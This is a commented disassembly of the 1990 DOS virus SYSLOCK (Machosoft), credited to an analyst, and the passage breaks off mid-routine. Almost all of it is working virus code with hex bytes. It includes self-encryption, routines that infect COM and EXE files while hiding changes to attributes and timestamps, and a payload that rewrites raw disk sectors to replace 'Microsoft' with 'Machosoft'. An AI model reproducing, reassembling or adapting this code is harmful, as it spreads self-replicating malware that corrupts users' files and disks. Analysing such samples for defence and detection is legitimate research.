; Virus SYSLOCK, version MACHOSOFT
; Founded in Poland in september 1990
;
; dissassembled by Andrzej Kadlof  October 14, 1990
;

; special *.COM loader

0100 EB14          JMP     0116

0102  14 00    ; generation number
0104  00 00    ; ?? some COM info
0106  02 00 
0108  00 00 
010A  00 00 
010C  00 00 
010E  00 00
0110  39 28    ; virus signature (6 bytes)
0012  46 03
0014  03 01

; normalize CS:IP and jump to virus

0116 8CC9          MOV     CX,CS
0118 8BD1          MOV     DX,CX
011A 81C14F00      ADD     CX,004F
011E 51            PUSH    CX
011F 33C9          XOR     CX,CX
0121 51            PUSH    CX
0122 CB            RETF

;--------------------------
; carrier program
;
; ....
;
;--------------------------

; COM entry point
 
0000 BB0100        MOV     BX,0001   ; carrier is COM
0003 90            NOP
0004 EB16          JMP     001C

; EXE entry point

0006 BB0200        MOV     BX,0002   ; carrier is EXE
0009 90            NOP
000A EB10          JMP     001C

000C 39 65       ; ??
000E 02 00       ; ??
0010 C1 07       ; year 1985
0012 01 01       ; january 1
0014 09 08       ; key for encryption/decryption
0016 00 00       ; ??
0018 08 00       ; new file size
001A 00 00       ; check sum for EXE file

; set registers DS, ES, SS, SP (virus uses private stack)

001C 8CD9          MOV     CX,DS
001E 8CCF          MOV     DI,CS
0020 8EDF          MOV     DS,DI
0022 8EC7          MOV     ES,DI
0024 8ED7          MOV     SS,DI
0026 8BFC          MOV     DI,SP
0028 BCDD0D        MOV     SP,0DDD  ; top of private stack
002B FC            CLD
002C E80300        CALL    0032     ; encryption of virus code
002F E94806        JMP     067A

;-------------------------------
; encryption/decryption routine

0032 50            PUSH    AX
0033 51            PUSH    CX
0034 56            PUSH    SI
0035 BE5900        MOV     SI,0059   ; offset of decrypted part of virus
0038 B92608        MOV     CX,0826   ; length of decrypted part
003B 90            NOP
003C D1E9          SHR     CX,1      ; convert bytes to words
003E 8AE1          MOV     AH,CL
0040 8AC1          MOV     AL,CL
0042 33061400      XOR     AX,[0014] ; key for decryption
0046 3104          XOR     [SI],AX
0048 46            INC     SI
0049 46            INC     SI
004A E2F2          LOOP    003E

004C 5E            POP     SI
004D 59            POP     CX
004E 58            POP     AX
004F C3            RET

;--------------------------------------------
; decrypt virus, write to disk, encrypt back

0050 E8DFFF        CALL    0032    ; encryption/decryption
0053 CD21          INT     21
0055 E8DAFF        CALL    0032    ; encryption/decryption
0058 C3            RET

;******************************************
; in file rest of virus code is decrypted

;--------------------------------
; get random number less than AX

0059 51            PUSH    CX
005A 52            PUSH    DX
005B 56            PUSH    SI
005C 8BF0          MOV     SI,AX
005E 46            INC     SI
005F B42C          MOV     AH,2C  ; get time
0061 CD21          INT     21

0063 8BC1          MOV     AX,CX  ; hour, minute
0065 03C2          ADD     AX,DX  ; seconds, hundredths of seconds
0067 33D2          XOR     DX,DX  ; prepare division
0069 F7FE          IDIV    SI
006B 8BC2          MOV     AX,DX  ; rest of division 
006D 5E            POP     SI
006E 5A            POP     DX
006F 59            POP     CX
0070 C3            RET

;******************************
; dead code (never called)

;--------------------------------
; display in hex number from AX

0071 52            PUSH    DX
0072 8AD4          MOV     DL,AH
0074 E80700        CALL    007E    ; display in hex byte from DL
0077 8AD0          MOV     DL,AL
0079 E80200        CALL    007E    ; display in hex byte from DL
007C 5A            POP     DX
007D C3            RET

;-------------------------------
; display in hex byte from DL

007E 53            PUSH    BX
007F 51            PUSH    CX
0080 8ADA          MOV     BL,DL   ; extract high nible
0082 B104          MOV     CL,04
0084 D2EB          SHR     BL,CL
0086 E80800        CALL    0091    ; display
0089 8ADA          MOV     BL,DL   ; low nible
008B E80300        CALL    0091    ; display
008E 59            POP     CX
008F 5B            POP     BX
0090 C3            RET

;---------------------------
; display hex digit from BX

0091 50            PUSH    AX
0092 53            PUSH    BX
0093 52            PUSH    DX
0094 81E30F00      AND     BX,000F
0098 8A97A400      MOV     DL,[BX+00A4]  ; convert to hex 
009C B402          MOV     AH,02         ; display character
009E CD21          INT     21
00A0 5A            POP     DX
00A1 5B            POP     BX
00A2 58            POP     AX
00A3 C3            RET

; hex digits

00A4 30 31 32 33 34 35 36 37 38 39 41 42 43 44 45 46  ; 0123456789ABCDEF

; end of dead code
;*************************

;----------------------
; get DOS wersion

00B4 B430          MOV     AH,30
00B6 CD21          INT     21
00B8 C3            RET

;--------------------------------------------
; prepare parameters for moving file pointer

00B9 33C9          XOR     CX,CX
00BB BA0400        MOV     DX,0004
00BE 90            NOP
00BF F8            CLC
00C0 C3            RET

;---------------------------------------------------
; read EXE file header and find entry point in file

00C1 50            PUSH    AX
00C2 53            PUSH    BX
00C3 B43F          MOV     AH,3F      ; read file
00C5 BA5409        MOV     DX,0954    ; to DS:DX
00C8 B91C00        MOV     CX,001C    ; number of bytes
00CB 90            NOP
00CC 8B1E5209      MOV     BX,[0952]  ; file handle
00D0 CD21          INT     21
00D2 721C          JB      00F0

00D4 8B165C09      MOV     DX,[095C]  ; header size in paragraphs
00D8 03166A09      ADD     DX,[096A]  ; CS
00DC 33C0          XOR     AX,AX      ; prepare for multiplication
00DE B90400        MOV     CX,0004

; multiple DX by 16, result store in AX

00E1 D1E2          SHL     DX,1
00E3 D1D0          RCL     AX,1
00E5 E2FA          LOOP    00E1

00E7 8BC8          MOV     CX,AX
00E9 81C21600      ADD     DX,0016
00ED 83D100        ADC     CX,+00
00F0 5B            POP     BX
00F1 58            POP     AX
00F2 C3            RET

;-------------------------------------------------------------------
; if DOS version 3.x then change info field 0004 in carrier on disk

00F3 50            PUSH    AX
00F4 53            PUSH    BX
00F5 51            PUSH    CX
00F6 52            PUSH    DX
00F7 57            PUSH    DI
00F8 56            PUSH    SI
00F9 0BDB          OR      BX,BX
00FB 7503          JNZ     0100

00FD EB71          JMP     0170        ; exit
00FF 90            NOP

0100 A3B808        MOV     [08B8],AX   ; ??
0103 E8AEFF        CALL    00B4        ; get DOS wersion
0106 3C03          CMP     AL,03
0108 7D03          JGE     010D

010A EB50          JMP     015C        ; house keeping end exit
010C 90            NOP

; DOS 3.x, look for full path to carrier

010D 8E06B208      MOV     ES,[08B2]   ; segment of carrier
0111 26            ES:
0112 8E062C00      MOV     ES,[002C]   ; segment of enviroment block
0116 33C0          XOR     AX,AX
0118 8BC8          MOV     CX,AX
011A F7D1          NOT     CX          ; FFFFh maximum size of enviroment
011C 8BF8          MOV     DI,AX       ; beginning of enviroment

011E F2            REPNZ               ; find end of enviroment
011F AE            SCASB
0120 26            ES:
0121 3805          CMP     [DI],AL
0123 75F9          JNZ     011E

0125 83C703        ADD     DI,+03      ; point at path to carrier
0128 8BD7          MOV     DX,DI
012A E8B300        CALL    01E0        ; get file parameters and open it
012D 722D          JB      015C        ; house keeping end exit

012F 813EB6080100  CMP     WORD PTR [08B6],0001 ; COM?
0135 7405          JZ      013C        ; yes

0137 E887FF        CALL    00C1        ; find entry point in EXE carrier
013A EB03          JMP     013F

013C E87AFF        CALL    00B9        ; DX:CX = 4:0, CLC, address in COM

013F 721B          JB      015C        ; house keeping end exit

0141 B80042        MOV     AX,4200     ; move file pointer
0144 8B1E5209      MOV     BX,[0952]   ; file handle
0148 CD21          INT     21
014A 7210          JB      015C        ; house keeping end exit

014C B440          MOV     AH,40       ; write file
014E BAB808        MOV     DX,08B8     ; buffer
0151 B90200        MOV     CX,0002     ; number of bytes
0154 8B1E5209      MOV     BX,[0952]   ; file handle
0158 CD21          INT     21
015A 7300          JAE     015C        ; ? what for ?

015C 9C            PUSHF               ; house keeping end exit
015D 8BD7          MOV     DX,DI       ; file name
015F 8E06B208      MOV     ES,[08B2]   ; carrier segment
0163 26            ES:
0164 8E062C00      MOV     ES,[002C]   ; enviroment block
0168 E8C100        CALL    022C        ; restore file parameters and close it

016B 8CDE          MOV     SI,DS
016D 8EC6          MOV     ES,SI
016F 9D            POPF

0170 5E            POP     SI
0171 5F            POP     DI
0172 5A            POP     DX
0173 59            POP     CX
0174 5B            POP     BX
0175 58            POP     AX
0176 C3            RET

;-----------------------------------
; analyse DTA file name
;   on exit AX = 3 - subdirectory
;                2 - EXE
;                1 - COM

0177 53            PUSH    BX
0178 56            PUSH    SI
0179 B80000        MOV     AX,0000
017C 8A1E3B09      MOV     BL,[093B]  ; get attributes
0180 80E310        AND     BL,10      ; directory?
0183 740D          JZ      0192       ; no

0185 803E44092E    CMP     BYTE PTR [0944],2E  ; current diretory
018A 7451          JZ      01DD       ; yes

018C B80300        MOV     AX,0003    ; subdir
018F EB4C          JMP     01DD       ; exit
0191 90            NOP

0192 8A1E3B09      MOV     BL,[093B]  ; attribute
0196 80E3C0        AND     BL,C0      ; unused bits
0199 7542          JNZ     01DD       ; exit

019B BE4409        MOV     SI,0944    ; file name

; locate extension

019E 803C2E        CMP     BYTE PTR [SI],2E  ; is extension present
01A1 740D          JZ      01B0

01A3 803C20        CMP     BYTE PTR [SI],20  ; empty
01A6 7435          JZ      01DD

01A8 803C00        CMP     BYTE PTR [SI],00  ; empty
01AB 7430          JZ      01DD

01AD 46            INC     SI      ; next character
01AE EBEE          JMP     019E

; is it COM?

01B0 807C0143      CMP     BYTE PTR [SI+01],43 ; 'C'
01B4 7512          JNZ     01C8

01B6 807C024F      CMP     BYTE PTR [SI+02],4F ; 'O'
01BA 750C          JNZ     01C8

01BC 807C034D      CMP     BYTE PTR [SI+03],4D ; 'M'
01C0 7506          JNZ     01C8

01C2 B80100        MOV     AX,0001   ; COM
01C5 EB16          JMP     01DD
01C7 90            NOP

; is it EXE?

01C8 807C0145      CMP     BYTE PTR [SI+01],45  ; 'E'
01CC 750F          JNZ     01DD

01CE 807C0258      CMP     BYTE PTR [SI+02],58  ; 'X'
01D2 7509          JNZ     01DD

01D4 807C0345      CMP     BYTE PTR [SI+03],45  ; 'E'
01D8 7503          JNZ     01DD

01DA B80200        MOV     AX,0002  ; EXE

; exit

01DD 5E            POP     SI
01DE 5B            POP     BX
01DF C3            RET

;-------------------------------------------------
; get and store file attributes, date/time stamp,
; clear read only and open file

01E0 50            PUSH    AX
01E1 53            PUSH    BX
01E2 51            PUSH    CX
01E3 52            PUSH    DX
01E4 1E            PUSH    DS
01E5 8CC0          MOV     AX,ES
01E7 8ED8          MOV     DS,AX
01E9 B80043        MOV     AX,4300   ; get file attributes
01EC CD21          INT     21

01EE 1F            POP     DS
01EF 7236          JB      0227

01F1 890E2009      MOV     [0920],CX ; store attributes
01F5 1E            PUSH    DS
01F6 8CC0          MOV     AX,ES
01F8 8ED8          MOV     DS,AX
01FA 81E1FEFF      AND     CX,FFFE   ; clear read only
01FE B80143        MOV     AX,4301   ; set file attribute
0201 CD21          INT     21

0203 1F            POP     DS
0204 7221          JB      0227

0206 1E            PUSH    DS
0207 8CC0          MOV     AX,ES
0209 8ED8          MOV     DS,AX
020B B8023D        MOV     AX,3D02    ; open file
020E CD21          INT     21

0210 1F            POP     DS
0211 7214          JB      0227

0213 8BD8          MOV     BX,AX       ; file handle
0215 A35209        MOV     [0952],AX   ; store it
0218 B80057        MOV     AX,5700     ; get file date/time stamp
021B CD21          INT     21
021D 7208          JB      0227

021F 89162209      MOV     [0922],DX   ; store date stamp
0223 890E2409      MOV     [0924],CX   ; store time stamp

0227 5A            POP     DX
0228 59            POP     CX
0229 5B            POP     BX
022A 58            POP     AX
022B C3            RET

;---------------------------------------------
; restore file parameters and close it
; file name address is given in DS:DX

022C 50            PUSH    AX
022D 53            PUSH    BX
022E 51            PUSH    CX
022F 52            PUSH    DX
0230 56            PUSH    SI
0231 8BF2          MOV     SI,DX
0233 8B1E5209      MOV     BX,[0952]  ; file handle
0237 8B0E2409      MOV     CX,[0924]  ; file time stamp
023B 8B162209      MOV     DX,[0922]  ; file date stamp
023F B80157        MOV     AX,5701    ; set file date/time stamp
0242 CD21          INT     21
0244 7217          JB      025D

0246 B43E          MOV     AH,3E      ; close file
0248 CD21          INT     21
024A 7211          JB      025D

024C 1E            PUSH    DS
024D 8B0E2009      MOV     CX,[0920]  ; file attributes
0251 8CC0          MOV     AX,ES
0253 8ED8          MOV     DS,AX
0255 8BD6          MOV     DX,SI
0257 B80143        MOV     AX,4301     ; set file attributes
025A CD21          INT     21

025C 1F            POP     DS
025D 5E            POP     SI
025E 5A            POP     DX
025F 59            POP     CX
0260 5B            POP     BX
0261 58            POP     AX
0262 C3            RET

;-----------------------
; add file name to path

0263 50            PUSH    AX
0264 51            PUSH    CX
0265 52            PUSH    DX
0266 57            PUSH    DI
0267 56            PUSH    SI
0268 BFBA08        MOV     DI,08BA   ; path
026B 8BCF          MOV     CX,DI
026D 32C0          XOR     AL,AL
026F F2            REPNZ
0270 AE            SCASB
0271 83EF04        SUB     DI,+04
0274 BE4409        MOV     SI,0944
0277 B90D00        MOV     CX,000D
027A F3            REPZ
027B A4            MOVSB
027C 5F            POP     DI
027D 5E            POP     SI
027E 5A            POP     DX
027F 59            POP     CX
0280 58            POP     AX
0281 C3            RET

;---------------------------------------------
; move file pointer at the beginning of file

0282 50            PUSH    AX
0283 53            PUSH    BX
0284 51            PUSH    CX
0285 52            PUSH    DX
0286 B80042        MOV     AX,4200     ; move file pointer
0289 33C9          XOR     CX,CX       ; offset from beginning
028B 33D2          XOR     DX,DX
028D 8B1E5209      MOV     BX,[0952]   ; file handle
0291 CD21          INT     21
0293 5A            POP     DX
0294 59            POP     CX
0295 5B            POP     BX
0296 58            POP     AX
0297 C3            RET

;-------------------------------------------------------------------
; find how many bytes should be added to file to get multiple of 16

0298 50            PUSH    AX
0299 53            PUSH    BX
029A 51            PUSH    CX
029B 52            PUSH    DX
029C B80242        MOV     AX,4202    ; move file pointer
029F 33C9          XOR     CX,CX
02A1 8B1E4009      MOV     BX,[0940]  ; file size (low word)
02A5 81E30F00      AND     BX,000F
02A9 BA1000        MOV     DX,0010
02AC 2BD3          SUB     DX,BX
02AE 81E20F00      AND     DX,000F
02B2 89161800      MOV     [0018],DX
02B6 8B1E5209      MOV     BX,[0952]  ; file handle
02BA CD21          INT     21

02BC 5A            POP     DX
02BD 59            POP     CX
02BE 5B            POP     BX
02BF 58            POP     AX
02C0 C3            RET

;------------------------
; infection of COM file

02C1 50            PUSH    AX
02C2 53            PUSH    BX
02C3 51            PUSH    CX
02C4 52            PUSH    DX
02C5 57            PUSH    DI
02C6 56            PUSH    SI
02C7 BE2108        MOV     SI,0821
02CA BF7F08        MOV     DI,087F
02CD B92300        MOV     CX,0023
02D0 90            NOP
02D1 F3            REPZ
02D2 A4            MOVSB
02D3 833E420900    CMP     WORD PTR [0942],+00  ; file size (high word)
02D8 7403          JZ      02DD

02DA E98500        JMP     0362      ; file too big, exit

02DD 813E400900F0  CMP     WORD PTR [0940],F000  ; file size (low word)
02E3 7204          JB      02E9

02E5 F9            STC
02E6 EB7A          JMP     0362      ; file too big, exit
02E8 90            NOP

02E9 B43F          MOV     AH,3F       ; read file
02EB BA2108        MOV     DX,0821     ; buffer
02EE B92300        MOV     CX,0023     ; number of bytes
02F1 90            NOP
02F2 8B1E5209      MOV     BX,[0952]   ; file handle
02F6 CD21          INT     21
02F8 7303          JAE     02FD

02FA EB66          JMP     0362        ; error, exit
02FC 90            NOP

02FD 813E21084D5A  CMP     WORD PTR [0821],5A4D  ; EXE marker
0303 7504          JNZ     0309

0305 F9            STC
0306 EB5A          JMP     0362      ; false COM, exit
0308 90            NOP

0309 BE0E08        MOV     SI,080E   ; compare 6 bytes against virus code
030C BF2108        MOV     DI,0821   ; destination
030F 81C71000      ADD     DI,0010
0313 B90600        MOV     CX,0006   ; length
0316 90            NOP
0317 F3            REPZ
0318 A6            CMPSB
0319 7504          JNZ     031F

031B F9            STC
031C EB44          JMP     0362      ; infected, exit
031E 90            NOP

; adjust length to 16 multiple

031F A14009        MOV     AX,[0940]   ; file size (low word)
0322 050001        ADD     AX,0100
0325 50            PUSH    AX
0326 250F00        AND     AX,000F
0329 58            POP     AX
032A 7406          JZ      0332

032C 25F0FF        AND     AX,FFF0
032F 051000        ADD     AX,0010
0332 B104          MOV     CL,04
0334 D3E8          SHR     AX,CL
0336 A31A08        MOV     [081A],AX  ; modyfy *.COM loader
0339 E846FF        CALL    0282   ; move file pointer at the beginning of file
033C 7224          JB      0362      ; exit

033E B440          MOV     AH,40     ; write file
0340 BAFE07        MOV     DX,07FE   ; new *.COM loader
0343 B92300        MOV     CX,0023   ; length
0346 90            NOP
0347 8B1E5209      MOV     BX,[0952] ; file handle
034B CD21          INT     21
034D 7213          JB      0362      ; exit

034F E846FF        CALL    0298      ; number of bytes to get multiple of 16
0352 720E          JB      0362

0354 B440          MOV     AH,40     ; write file
0356 33D2          XOR     DX,DX
0358 B9DF0D        MOV     CX,0DDF   ; virus size
035B 8B1E5209      MOV     BX,[0952]  ; file handle
035F E8EEFC        CALL    0050   ; decrypt virus, write to disk, encrypt back

0362 9C            PUSHF
0363 BE7F08        MOV     SI,087F
0366 BF2108        MOV     DI,0821
0369 B92300        MOV     CX,0023
036C 90            NOP
036D F3            REPZ
036E A4            MOVSB
036F 9D            POPF
0370 5E            POP     SI
0371 5F            POP     DI
0372 5A            POP     DX
0373 59            POP     CX
0374 5B            POP     BX
0375 58            POP     AX
0376 C3            RET

;-----------------
; infect EXE file

0377 50            PUSH    AX
0378 53            PUSH    BX
0379 51            PUSH    CX
037A 52            PUSH    DX
037B 57            PUSH    DI
037C 56            PUSH    SI
037D BE4408        MOV     SI,0844
0380 BFA208        MOV     DI,08A2
0383 B90A00        MOV     CX,000A
0386 90            NOP
0387 F3            REPZ
0388 A4            MOVSB
0389 A11600        MOV     AX,[0016]    ; ??
038C A3AC08        MOV     [08AC],AX    ; ??
038F C70616000000  MOV     WORD PTR [0016],0000  ; ??
0395 B43F          MOV     AH,3F        ; read file
0397 BA5409        MOV     DX,0954      ; buffer
039A B91C00        MOV     CX,001C      ; header size
039D 90            NOP
039E 8B1E5209      MOV     BX,[0952]    ; file handle
03A2 CD21          INT     21

03A4 7302          JAE     03A8

03A6 EBBA          JMP     0362        ; errors, exit

03A8 A16609        MOV     AX,[0966]   ; EXE file check sum
03AB A31A00        MOV     [001A],AX   ; store it
03AE 3DB67C        CMP     AX,7CB6     ; virus signature ??
03B1 7504          JNZ     03B7

03B3 F9            STC

03B4 E9CD00        JMP     0484        ; infected, exit

03B7 A15809        MOV     AX,[0958]   ; page count
03BA 48            DEC     AX
03BB BA0002        MOV     DX,0200     ; size of page
03BE F7E2          MUL     DX
03C0 03065609      ADD     AX,[0956]   ; part page
03C4 83D200        ADC     DX,+00
03C7 3B164209      CMP     DX,[0942]   ; file size (high word)
03CB 7506          JNZ     03D3

03CD 3B064009      CMP     AX,[0940]   ; file size (low word)
03D1 7404          JZ      03D7

03D3 F9            STC
03D4 E9AD00        JMP     0484         ; exit

03D7 A16A09        MOV     AX,[096A]    ; CS
03DA A34408        MOV     [0844],AX
03DD A16809        MOV     AX,[0968]    ; IP
03E0 A34608        MOV     [0846],AX
03E3 A16209        MOV     AX,[0962]    ; SS
03E6 A34808        MOV     [0848],AX
03E9 A16409        MOV     AX,[0964]    ; SP
03EC A34A08        MOV     [084A],AX
03EF C70668090600  MOV     WORD PTR [0968],0006  ; IP
03F5 C7066409DD0D  MOV     WORD PTR [0964],0DDD  ; SP
03FB 8B1E4209      MOV     BX,[0942]    ; file size (high word)
03FF 8B164009      MOV     DX,[0940]    ; file size (low word)
0403 50            PUSH    AX
0404 8BC2          MOV     AX,DX
0406 250F00        AND     AX,000F
0409 58            POP     AX
040A 7407          JZ      0413

040C 81E2F0FF      AND     DX,FFF0
0410 83C210        ADD     DX,+10
0413 83D300        ADC     BX,+00
0416 B90400        MOV     CX,0004
0419 D1EB          SHR     BX,1
041B D1DA          RCR     DX,1
041D E2FA          LOOP    0419

041F 2B165C09      SUB     DX,[095C]   ; header size
0423 89166A09      MOV     [096A],DX   ; CS
0427 89166209      MOV     [0962],DX   ; SS
042B 89164C08      MOV     [084C],DX   ; virus position in file
042F A15609        MOV     AX,[0956]   ; part page
0432 50            PUSH    AX
0433 250F00        AND     AX,000F
0436 58            POP     AX
0437 7406          JZ      043F

0439 25F0FF        AND     AX,FFF0
043C 051000        ADD     AX,0010
043F 05DF0D        ADD     AX,0DDF
0442 8BD8          MOV     BX,AX
0444 25FF01        AND     AX,01FF
0447 7503          JNZ     044C

0449 B80002        MOV     AX,0200
044C A35609        MOV     [0956],AX  ; part page
044F B109          MOV     CL,09
0451 D3EB          SHR     BX,CL
0453 011E5809      ADD     [0958],BX  ; page count
0457 C7066609B67C  MOV     WORD PTR [0966],7CB6   ; check sum

045D E822FE        CALL    0282   ; move file pointer at the beginning of file

0460 7222          JB      0484       ; exit

; write new EXE header to file

0462 B440          MOV     AH,40      ; write file
0464 BA5409        MOV     DX,0954    ; new header
0467 B91C00        MOV     CX,001C    ; size of EXE header
046A 90            NOP
046B 8B1E5209      MOV     BX,[0952]  ; file handle
046F CD21          INT     21

0471 7211          JB      0484       ; exit

0473 E822FE        CALL    0298       ; number of bytes to get multiple of 16

; write virus body to file

0476 B440          MOV     AH,40     ; write file
0478 33D2          XOR     DX,DX
047A B9DF0D        MOV     CX,0DDF   ; virus size
047D 8B1E5209      MOV     BX,[0952] ; file handle
0481 E8CCFB        CALL    0050      ; decrypt, write. encrypt

0484 BEA208        MOV     SI,08A2
0487 BF4408        MOV     DI,0844
048A B90A00        MOV     CX,000A
048D 90            NOP
048E F3            REPZ
048F A4            MOVSB
0490 A1AC08        MOV     AX,[08AC]    ; 
0493 A31600        MOV     [0016],AX
0496 5E            POP     SI
0497 5F            POP     DI
0498 5A            POP     DX
0499 59            POP     CX
049A 5B            POP     BX
049B 58            POP     AX
049C C3            RET

;-------------
; infect file

049D 50            PUSH    AX
049E 52            PUSH    DX
049F FF060008      INC     WORD PTR [0800]  ; number of generation
04A3 BABA08        MOV     DX,08BA     ; buffer for file name
04A6 E837FD        CALL    01E0        ; get file parameters and open it

04A9 7228          JB      04D3

04AB B8F0F0        MOV     AX,F0F0
04AE E8A8FB        CALL    0059      ; get random number less than AX

04B1 A31400        MOV     [0014],AX ; key for decryption
04B4 E8CBFD        CALL    0282   ; move file pointer at the beginning of file

04B7 721A          JB      04D3   ; exit

04B9 833E1E0901    CMP     WORD PTR [091E],+01  ; COM?
04BE 7409          JZ      04C9

04C0 833E1E0902    CMP     WORD PTR [091E],+02  ; EXE?
04C5 7407          JZ      04CE

04C7 EB0A          JMP     04D3    ; exit

04C9 E8F5FD        CALL    02C1    ; infect COM file

04CC EB03          JMP     04D1

04CE E8A6FE        CALL    0377    ; infect EXE file

04D1 7301          JAE     04D4

04D3 F9            STC
04D4 BABA08        MOV     DX,08BA
04D7 9C            PUSHF

04D8 E851FD        CALL    022C        ; restore file parameters and close it

04DB FF0E0008      DEC     WORD PTR [0800]  ; generation number

04DF 9D            POPF
04E0 5A            POP     DX
04E1 58            POP     AX
04E2 C3            RET

;------------------------------------
; get generation number and 0004 info

04E3 833EB60801    CMP     WORD PTR [08B6],+01  ; carrier is COM?
04E8 7409          JZ      04F3    ; yes

; EXE

04EA A11600        MOV     AX,[0016]  ; ??
04ED 8B1E0008      MOV     BX,[0800]  ; generation number
04F1 EB0F          JMP     0502    ; RET

; COM

04F3 06            PUSH    ES
04F4 8E06B008      MOV     ES,[08B0]  ; code segment of carrier
04F8 26            ES:
04F9 A10401        MOV     AX,[0104]  ; ??
04FC 26            ES:
04FD 8B1E0201      MOV     BX,[0102]  ; ??
0501 07            POP     ES
0502 C3            RET

;---------------------------
; read IBMNETIO.SYS file

0503 53            PUSH    BX
0504 51            PUSH    CX
0505 52            PUSH    DX
0506 A04E08        MOV     AL,[084E]   ; drive number
0509 0441          ADD     AL,41       ; convert to letter
050B A26508        MOV     [0865],AL   ; store it
050E B8003D        MOV     AX,3D00     ; open file, for read only
0511 BA6508        MOV     DX,0865     ; X:\IBMNETIO.SYS,0
0514 CD21          INT     21
0516 7304          JAE     051C

0518 33C0          XOR     AX,AX
051A EB17          JMP     0533     ; exit

051C 8BD8          MOV     BX,AX
051E B43F          MOV     AH,3F     ; read file
0520 B90200        MOV     CX,0002
0523 BA4F08        MOV     DX,084F
0526 CD21          INT     21
0528 72EE          JB      0518

052A B43E          MOV     AH,3E     ; Close file
052C CD21          INT     21
052E 72E8          JB      0518

0530 A14F08        MOV     AX,[084F] ; IBMNETIO.SYS contens
0533 5A            POP     DX
0534 59            POP     CX
0535 5B            POP     BX
0536 C3            RET

;---------------------------
; create file IBMNETIO.SYS

0537 50            PUSH    AX
0538 53            PUSH    BX
0539 51            PUSH    CX
053A 52            PUSH    DX
053B A34F08        MOV     [084F],AX   ; store IBMNETIO.SYS contens
053E B43C          MOV     AH,3C       ; create handle
0540 B90600        MOV     CX,0006     ; attributes System and Hiden
0543 BA6508        MOV     DX,0865     ; file name
0546 CD21          INT     21

0548 8BD8          MOV     BX,AX       ; file handle
054A B440          MOV     AH,40       ; write file
054C B90200        MOV     CX,0002     ; number of bytes
054F BA4F08        MOV     DX,084F     ; buffer
0552 CD21          INT     21

0554 B43E          MOV     AH,3E       ; close file
0556 CD21          INT     21

0558 5A            POP     DX
0559 59            POP     CX
055A 5B            POP     BX
055B 58            POP     AX
055C C3            RET

;--------------------------------------------------------------
; routine called if system date is set after January 1, 1985
; it search disk and replaces string Microsoft onto Machosoft

055D 50            PUSH    AX
055E 53            PUSH    BX
055F 51            PUSH    CX
0560 52            PUSH    DX
0561 56            PUSH    SI
0562 57            PUSH    DI
0563 06            PUSH    ES
0564 8CD8          MOV     AX,DS
0566 8EC0          MOV     ES,AX
0568 E878FF        CALL    04E3        ; get generation number and 0004 info
056B 40            INC     AX
056C 3D0400        CMP     AX,0004
056F 7502          JNZ     0573

0571 33C0          XOR     AX,AX

0573 E87DFB        CALL    00F3        ; modify 0004 in carrier file on disk
0576 B419          MOV     AH,19       ; get current disk
0578 CD21          INT     21

057A A24E08        MOV     [084E],AL   ; current drive
057D B436          MOV     AH,36       ; get disk free
057F 8A164E08      MOV     DL,[084E]   ; for current drive
0583 FEC2          INC     DL
0585 CD21          INT     21

0587 81F90004      CMP     CX,0400     ; bytes per sector
058B 7E03          JLE     0590

058D E9AF00        JMP     063F        ; sectors too big for my buffer!

0590 890E7409      MOV     [0974],CX   ; bytes per sector
0594 F7E2          MUL     DX          ; total number of clusters on disk
0596 A37709        MOV     [0977],AX   ; number of sectors on disk
0599 E867FF        CALL    0503        ; read IBMNETIO.SYS file

059C A37009        MOV     [0970],AX   ; number of sector to start search
059F B82000        MOV     AX,0020     ; number of sectors to search
05A2 A37209        MOV     [0972],AX

05A5 A17009        MOV     AX,[0970]
05A8 3B067709      CMP     AX,[0977]   ; last sector?
05AC 7206          JB      05B4        ; no

05AE C70670090000  MOV     WORD PTR [0970],0000  ; reset counter

05B4 8B167009      MOV     DX,[0970]   ; sector
05B8 A04E08        MOV     AL,[084E]   ; drive
05BB BB7909        MOV     BX,0979     ; DTA
05BE B90100        MOV     CX,0001     ; number of sectors
05C1 CD25          INT     25          ; read disk sectors

05C3 58            POP     AX          ; balance stack
05C4 72C7          JB      058D        ; exit

05C6 C606760900    MOV     BYTE PTR [0976],00  ; flag, sector readed
05CB 90            NOP
05CC BF0000        MOV     DI,0000     ; start of buffer

05CF BE5108        MOV     SI,0851     ; address of string 'MICROSOFT'

05D2 8A04          MOV     AL,[SI]
05D4 46            INC     SI
05D5 0AC0          OR      AL,AL
05D7 7411          JZ      05EA

05D9 32857909      XOR     AL,[DI+0979]
05DD 47            INC     DI
05DE 3B3E7409      CMP     DI,[0974]    ; bytes per sector
05E2 742D          JZ      0611

05E4 24DF          AND     AL,DF        ; convert to upper case ?
05E6 75E7          JNZ     05CF         ; start again

05E8 EBE8          JMP     05D2         ; check next character

05EA C606760901    MOV     BYTE PTR [0976],01   ; founded
05EF 90            NOP
05F0 56            PUSH    SI
05F1 57            PUSH    DI
05F2 51            PUSH    CX
05F3 BE5B08        MOV     SI,085B      ; string 'MACHOSOFT'
05F6 B90900        MOV     CX,0009      ; length
05F9 90            NOP
05FA 2BF9          SUB     DI,CX        ; change MICRO to MACHO in buffer

05FC 8A857909      MOV     AL,[DI+0979]
0600 2420          AND     AL,20        ; ' '
0602 0A04          OR      AL,[SI]
0604 88857909      MOV     [DI+0979],AL
0608 46            INC     SI
0609 47            INC     DI
060A E2F0          LOOP    05FC

060C 59            POP     CX
060D 5F            POP     DI
060E 5E            POP     SI
060F EBBE          JMP     05CF       ; look for next ocurence of Micro...

0611 A07609        MOV     AL,[0976]  ; buffer changed?
0614 0AC0          OR      AL,AL
0616 7502          JNZ     061A       ; yes

0618 EB12          JMP     062C       ; test next sector

061A A04E08        MOV     AL,[084E]  ; drive
061D BB7909        MOV     BX,0979    ; DTA
0620 B90100        MOV     CX,0001    ; number of sectors
0623 8B167009      MOV     DX,[0970]  ; sector
0627 CD26          INT     26         ; wirte sector

0629 58            POP     AX
062A 7213          JB      063F       ; exit

062C FF067009      INC     WORD PTR [0970]  ; sector number
0630 FF0E7209      DEC     WORD PTR [0972]  ; sectors counter
0634 7403          JZ      0639       ; all sectors tested 

0636 E96CFF        JMP     05A5       ; search next sector

0639 A17009        MOV     AX,[0970]  ; sector number
063C E8F8FE        CALL    0537       ; create file IBMNETIO.SYS

063F 07            POP     ES
0640 5F            POP     DI
0641 5E            POP     SI
0642 5A            POP     DX
0643 59            POP     CX
0644 5B            POP     BX
0645 58            POP     AX
0646 C3            RET

;----------------------------------------------
; search enviroment block for string VIRUS=OFF
; if present then set carry 

0647 51            PUSH    CX
0648 57            PUSH    DI
0649 56            PUSH    SI
064A 06            PUSH    ES
064B 8E06B208      MOV     ES,[08B2]   ; segment of carrier
064F 26            ES:
0650 8E062C00      MOV     ES,[002C]   ; segment of enviroment block
0654 33FF          XOR     DI,DI       ; beginning of enviroment

